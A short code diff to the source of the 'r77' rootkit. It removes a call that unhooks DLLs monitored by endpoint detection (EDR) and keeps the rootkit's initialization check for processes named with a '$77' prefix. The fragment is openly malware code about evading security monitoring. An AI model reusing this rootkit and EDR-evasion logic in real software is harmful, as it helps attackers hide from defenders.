@@ -3,16 +3,12 @@
 #include "Config.h"
 #include "r77def.h"
 #include "r77header.h"
-#include "Unhook.h"
 #include <Shlwapi.h>
 
 static BOOL RootkitInitialized;
 
 BOOL InitializeRootkit()
 {
-	// Unhook DLL's that are monitored by EDR.
-	Unhook();
-
 	// If the process starts with $77, do not load r77.
 	WCHAR executablePath[MAX_PATH + 1];
 	if (FAILED(GetModuleFileNameW(NULL, executablePath, MAX_PATH))) return FALSE;
